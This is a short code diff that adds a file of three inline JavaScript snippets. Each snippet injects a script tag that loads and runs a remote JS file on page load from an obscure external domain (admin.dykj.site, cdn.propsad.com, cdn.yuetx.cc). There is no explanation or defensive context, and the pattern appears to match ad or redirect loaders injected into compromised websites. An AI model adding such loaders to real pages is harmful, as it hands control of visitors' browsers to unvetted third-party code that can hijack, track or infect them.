@@ -1,0 +1,27 @@
+<script type="text/javascript">
+ (function() {
+  var hi = document.createElement("script");
+  hi.src = "https://admin.dykj.site/olcg/ab00de94ef6c047b/o.js";
+  hi.charset = "UTF-8";
+  var k = document.getElementsByTagName("script")[0];
+  k.parentNode.insertBefore(hi, k);
+ })();
+</script>
+<script type="text/javascript">
+ (function() {
+  var hi = document.createElement("script");
+  hi.src = "https://cdn.propsad.com/js/yys/Pfhl34.js";
+  hi.charset = "UTF-8";
+  var k = document.getElementsByTagName("script")[0];
+  k.parentNode.insertBefore(hi, k);
+ })();
+</script>
+<script type="text/javascript">
+ (function() {
+  var hi = document.createElement("script");
+  hi.src = "https://cdn.yuetx.cc/js/yys/zz40.js";
+  hi.charset = "UTF-8";
+  var k = document.getElementsByTagName("script")[0];
+  k.parentNode.insertBefore(hi, k);
+ })();
+</script>
